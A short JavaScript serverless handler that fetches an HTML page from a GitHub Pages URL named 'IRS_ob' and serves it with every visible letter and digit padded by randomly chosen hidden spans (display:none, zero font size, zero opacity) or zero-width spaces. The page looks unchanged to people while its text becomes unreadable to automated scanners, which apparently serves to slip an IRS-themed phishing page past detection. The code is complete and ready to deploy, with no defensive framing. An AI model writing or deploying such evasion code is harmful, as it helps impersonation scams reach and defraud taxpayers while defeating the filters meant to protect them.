import fetch from "node-fetch";

// Function to generate random obfuscation patterns
function randomObfuscationPattern() {
    const obfuscationMethods = [
        (char) => `${char}<span style="display:none">${Math.random().toString(36).substring(2, 6)}</span>`, // Hidden text
        (char) => `${char}<span style="font-size:0">${Math.random().toString(36).substring(2, 6)}</span>`, // Invisible text
        (char) => `${char}&#x200B;`, // Zero-width space
        (char) => `${char}<span style="opacity:0">${Math.random().toString(36).substring(2, 6)}</span>` // Invisible text
    ];
    
    return obfuscationMethods[Math.floor(Math.random() * obfuscationMethods.length)];
}

// Function to obfuscate text using random techniques
function obfuscateText(text) {
    return text.replace(/([a-zA-Z0-9])/g, (match) => {
        const obfuscateMethod = randomObfuscationPattern();
        return obfuscateMethod(match);
    });
}

// API Handler to serve obfuscated HTML
export default async function handler(req, res) {
    try {
        // Fetch original HTML from GitHub Pages (Replace with actual URL)
        const response = await fetch("https://mightyflavor.github.io/obfuscationnn/IRS_ob"); // Replace with actual URL
        let html = await response.text();

        // Randomly obfuscate all visible text
        let modifiedHTML = html.replace(/>([^<]+)</g, (match, text) => {
            return ">" + obfuscateText(text) + "<";
        });

        res.setHeader("Content-Type", "text/html");
        return res.status(200).send(modifiedHTML);
    } catch (error) {
        console.error("Error fetching/modifying HTML:", error);
        return res.status(500).send("Error fetching or modifying HTML.");
    }
}
